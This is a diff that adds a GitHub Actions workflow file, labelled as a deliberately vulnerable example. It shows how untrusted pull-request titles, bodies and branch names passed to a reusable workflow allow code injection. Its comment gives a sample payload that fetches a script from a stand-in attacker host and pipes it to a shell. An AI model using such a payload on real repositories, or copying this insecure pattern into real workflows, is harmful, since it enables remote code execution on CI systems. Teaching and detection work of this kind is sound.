@@ -1,0 +1,28 @@
+# Vulnerable example: Untrusted input passed to reusable workflow
+# This demonstrates how untrusted data can flow through reusable workflows
+# and create code injection vulnerabilities.
+#
+# Attack scenario:
+# 1. Attacker creates a malicious PR with title containing: `$(curl attacker.com/malicious.sh | sh)`
+# 2. The caller workflow passes this untrusted title to the reusable workflow
+# 3. The reusable workflow uses it directly in a run script
+# 4. Code injection occurs with the privileges of the workflow
+
+name: Vulnerable Reusable Workflow Caller
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  call-vulnerable-workflow:
+    uses: ./.github/workflows/reusable-processor.yml
+    with:
+      # VULNERABLE: Passing untrusted PR title to reusable workflow
+      pr_title: ${{ github.event.pull_request.title }}
+      # VULNERABLE: Passing untrusted PR body
+      pr_body: ${{ github.event.pull_request.body }}
+      # VULNERABLE: Passing untrusted head ref
+      branch_name: ${{ github.head_ref }}
+      # SAFE: Static value
+      environment: production
